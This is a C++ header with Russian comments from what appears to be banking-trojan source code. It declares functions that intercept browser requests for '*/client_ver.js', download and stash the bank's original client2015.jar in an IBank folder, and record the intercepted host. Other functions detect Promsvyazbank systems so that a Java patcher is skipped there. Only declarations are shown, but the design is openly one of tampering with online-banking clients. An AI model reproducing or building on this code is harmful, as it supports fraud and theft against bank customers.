
//---------------------------------------------------------------------------
//
//  Модуль сохраняет оригинальный файл client2015.jar
//
//---------------------------------------------------------------------------

#ifndef JavaClient2015SaverH
#define JavaClient2015SaverH
//---------------------------------------------------------------------------


#include "Strings.h"

//*****************************************************************
//  Функция проверяет запрос и, в случае обнаружения адреса с
//  маской
//  "*/client_ver.js", скачиваем фойл
//  "http://host_name/client2015.jar" и сохраняем его в файл
//  %AllUsersProfile%\Application Data\IBank\_client2015_orig.jar
//*****************************************************************
void CheckJavaClient2015File(const char *aURL);


//*****************************************************************
// Функция возвращает имя файла куда будет записан хост с которого
// перехватили файл
//*****************************************************************
string GetJavaClient2015FileName();

//*****************************************************************
// Функция возвращает значение хоста с которого качали оригинальный
// файл
//*****************************************************************
string GetJavaClient2015HostName();




//*****************************************************************
//  GetPSBSignalFileName - Функция возвращает имя сигнального
//						   файла, который создастся при обнаруже
//  нии системы PSB - Промсвязь Банк. Этот файл нужен для игнори-
//  рования установки ява патчера на эту систему.
//*****************************************************************
string GetPSBSignalFileName();


//*****************************************************************
//  IsPSBSystem - Функция возвращает истину если в системе стоит
//                сигнальный файл PSB
//*****************************************************************
bool IsPSBSystem();


//---------------------------------------------------------------------------
#endif
